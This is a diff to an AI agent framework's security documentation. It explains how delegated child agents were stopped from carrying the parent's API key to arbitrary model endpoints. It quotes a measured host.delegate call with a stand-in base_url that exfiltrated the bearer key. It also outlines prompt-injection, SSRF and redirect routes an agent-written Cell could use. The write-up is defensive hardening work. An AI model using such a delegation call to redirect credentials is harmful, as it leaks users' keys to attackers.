@@ -680,6 +680,84 @@ connector and model-profile responses are allowlist projections (`env_keys` /
 `tests/test_secret_canary.py` that assert on the secret's bytes rather than on
 field names.
 
+### A delegated child's model credential follows its endpoint
+
+A delegation spec may override a child's model -- `model` as a model id, or a
+mapping of `provider` / `model` / `base_url` / `max_tokens` / `temperature` /
+`timeout_s`, plus a top-level `provider` -- from a Python Cell
+(`host.delegate({"request": …, "model": {…}})`), from a `delegate_task` request,
+or from a stored specialist profile's overrides (`_with_profile_overrides` in
+`openai4s/host/delegation.py`). The child's `LLMConfig` used to be a copy of the
+parent's with those fields set on it, so the parent's resolved `api_key` -- on
+the Web the active profile's key, an environment key, or a team member's own
+(M4-1) -- went wherever the override pointed. A Cell is agent-written and
+prompt-injectable, and the LLM transport has no egress allowlist. Measured:
+`host.delegate({"request": "…", "model": {"base_url": "https://x.example/v1"}})`
+sent `Authorization: Bearer <parent key>` to
+`https://x.example/v1/chat/completions`.
+
+`openai4s/agent/child_model.py` now decides a child's configuration by the rule
+`ModelProfileService.credential` already applies to profiles and pinned
+revisions: a key goes only to the destination it was resolved for, where a
+destination is `(provider, endpoint)` as `chat()` dispatches it, compared with
+`normalize_endpoint`.
+
+1. **An unchanged destination keeps the parent's credential** -- a different
+   model id, a generation knob, the parent's endpoint spelled with a trailing
+   slash or in another case. It is assigned explicitly: `dataclasses.replace`
+   re-runs `LLMConfig.__post_init__`, which refills an empty key from the
+   environment, so a keyless local parent's child used to carry the generic
+   cloud key over plain http to the local server.
+2. **A child that moves never takes the parent's key.** It may move only to a
+   destination the install has configured, and takes that destination's own
+   credential.
+   - **Web** (`SessionRunner._child_destination_credential`):
+     `ModelProfileService.destination_credential` answers -- a saved profile
+     whose current `(provider, endpoint)` is the destination (through its
+     `credential`), a registered provider's own endpoint, or the daemon's
+     explicitly configured endpoint as dispatch
+     resolves it (keyless when local, then that provider's environment key,
+     by the same `credential` rule). The session owner's own key is then
+     considered through `_apply_user_llm_key`, which sends it only to that
+     provider's registered HTTPS, non-local endpoint. A saved proxy receives
+     its profile credential, not a member's provider key. The daemon's own
+     key and provider environment key cannot fill an unrelated saved proxy's
+     empty credential.
+   - **CLI** (no profiles): `environment_credential` answers -- only a
+     registered provider's own endpoint, keyless when local, else
+     `provider_env_api_key` for exactly that provider, never the generic
+     `OPENAI4S_LLM_API_KEY`, which belongs to the provider the process was
+     started for. If two custom provider ids map to the same shell variable
+     (for example, hyphen versus underscore), neither claims that variable.
+3. **Anything else is refused**, not dispatched keyless. Withholding the key
+   is not the whole risk: a free-form endpoint also let a Cell that the kernel
+   sandbox keeps off the network have the daemon POST to any host it named, a
+   private or link-local one included, and read the reply back through the
+   child's error. A configured destination with no usable credential is
+   refused as well, with its own message.
+
+A child-supplied `base_url` with userinfo, a query, a fragment, or control
+characters is refused even if its normalized endpoint matches the parent's or
+a saved profile. The transport uses the raw URL, so those parts could alter the
+request or select a redirect while the normalized comparison retained a key.
+Default HTTP(S) ports compare as the same destination; port zero is refused.
+The LLM transport also refuses redirects so an admitted endpoint cannot
+forward an Authorization header to another origin.
+
+The refusal happens at admission, in the delegating Cell, before any budget is
+reserved or child row written; a restored or retried child that meets it later
+fails before its first provider request. The owner is kept on the delegation
+tree, so a grandchild -- whose runner the child Agent builds without one -- is
+judged by the same rule. A provider switch also no longer inherits the parent's
+concrete endpoint and model (the rule `SessionRunner._llm_cfg` applies), which
+had sent a `claude` child the Anthropic wire to the OpenAI endpoint under the
+OpenAI key.
+
+Pinned by `tests/test_delegation_credential_scope.py`. Its end-to-end cases run
+a real kernel and the real Host RPC with only `openai4s.llm._post_json`
+replaced, and assert on the URL and headers that seam was handed; each refusal
+has a control that still dispatches.
+
 ### BYOC provider import-time secret scrubbing
 
 The remote-compute worker (`openai4s_compute_provider`) loads an untrusted-ish provider shim (`skills/remote-compute-<id>/provider.py`) by file path. To keep a provider's **top-level module code** from reading credential-shaped or known-prefix environment variables, scrubbing is two-staged. This is a **name-based heuristic** — a secret stored in a variable whose name matches neither rule below is **not** scrubbed:
